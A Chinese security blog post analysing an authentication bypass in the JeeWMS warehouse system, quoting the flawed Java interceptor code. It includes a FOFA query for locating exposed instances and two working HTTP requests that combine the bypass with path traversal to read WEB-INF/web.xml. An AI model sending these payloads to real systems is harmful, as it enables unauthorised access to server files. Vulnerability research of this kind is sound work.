---
title: "JeeWMS AuthInterceptor 权限绕过漏洞"
source: https://mrxn.net/jswz/JeeWMS-AuthInterceptor-authbypass.html
asset_dir: assets/jeewms-authinterceptor-权限绕过漏洞
---

# JeeWMS AuthInterceptor 权限绕过漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/27 08:19
* 930浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

SQL

软件

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS `AuthInterceptor` 存在[权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)漏洞，由于系统获取请求路径使用 `request.getRequestURI()` 导致可以通过配合 `excludeContainUrls` 达到绕过系统权限校验逻辑。

漏洞扫描服务

# 影响版本

最新版本（低于commit 7f78ed57）

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

先看下 `web.xml` 里关于 `excludeContainUrls` 部分的配置

```
<property name="excludeContainUrls">
  <list>
    <value>systemController/showOrDownByurl.do</value>
    <value>wmsApiController.do</value>
  </list>
</property>
```

包含两条URL path

* `systemController/showOrDownByurl.do`
* `wmsApiController.do`

再看下 `AuthInterceptor.java` 中在controller前拦截的函数 `preHandle`

深入探索

在线安全工具

Windows安全工具

编码转换工具

```
@Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object object) throws Exception {
        String requestPath = ResourceUtil.getRequestPath(request); // 用户访问的资源地址
        //logger.info("-----authInterceptor----requestPath------" + requestPath);
        // 步骤一： 判断是否是排除拦截请求，直接返回 TRUE
        if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
            return true;
        }
        if (excludeUrls.contains(requestPath)) {
            return true;
        } else if (moHuContain(excludeContainUrls, requestPath)) {
            return true;
        } else {
```

这里对 `requestPath` 经过前面两个 if 判断后，在第三个 if 的部分，调用了 `moHuContain` 方法来判断请求的url路径是否包含 `excludeContainUrls` 里面的值之一。

```
private boolean moHuContain(List<String> list, String key) {
        for (String str : list) {
            if (key.contains(str)) {
                return true;
            }
        }
        return false;
    }
```

`moHuContain` 的作用就是检查一个字符串`key`是否模糊包含（即包含）列表`list`中的任意一个字符串元素。

深入探索

JSON处理工具

物流软件安全

文件大小转换

也就是说如果请求url路径包含 `systemController/showOrDownByurl.do` 或 `wmsApiController.do` 之一返回 `true` ，即[绕过权限验证](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

再回头看 `String requestPath = ResourceUtil.getRequestPath(request);` 这句对请求url路径的赋值，跟进 `ResourceUtil.getRequestPath` 方法

```
public static String getRequestPath(HttpServletRequest request) {

//      String requestPath = request.getRequestURI() + "?" + request.getQueryString();
        String queryString = request.getQueryString();
        String requestPath = request.getRequestURI();
        if(StringUtils.isNotEmpty(queryString)){
            requestPath += "?" + queryString;
        }

        if (requestPath.indexOf("&") > -1) {// 去掉其他参数
            requestPath = requestPath.substring(0, requestPath.indexOf("&"));
        }
        requestPath = requestPath.substring(request.getContextPath().length() + 1);// 去掉项目路径
        return requestPath;
    }
```

使用了 `request.getRequestURI()` 来获取请求url路径，而这个又回到了老生常谈的问题，具体的底层处理逻辑可以去先知（Tomcat URL解析差异性导致的安全问题）1学习下，至此所有链路都通了，下面我们用之前的文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)测试下。

安全研究工具

# 漏洞复现

```
POST /systemController/showOrDownByurl.do/../../cgformTemplateController.do?showPic=11 HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded

code=../../../&path=../web.xml
```

```
POST /wmsApiController.do/../cgformTemplateController.do?showPic=11 HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded

code=../../../../&path=../WEB-INF/web.xml
```

成功读取到了 web.xml 文件内容

漏洞扫描服务

[![JeeWMS AuthInterceptor 权限绕过漏洞](images/img-001-a61fb95d7bae.webp)](https://image.mrxn.net/79509fe0485645209e7499b02f2eb937.webp)

# 参考

* `https://xz.aliyun.com/news/7139`
* `https://gitee.com/erzhongxmu/JEEWMS/issues/IC8RPM`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[JeeWMS AuthInterceptor 权限绕过漏洞](https://mrxn.net/jswz/JeeWMS-AuthInterceptor-authbypass.html)  
文章链接：<https://mrxn.net/jswz/JeeWMS-AuthInterceptor-authbypass.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-AuthInterceptor-authbypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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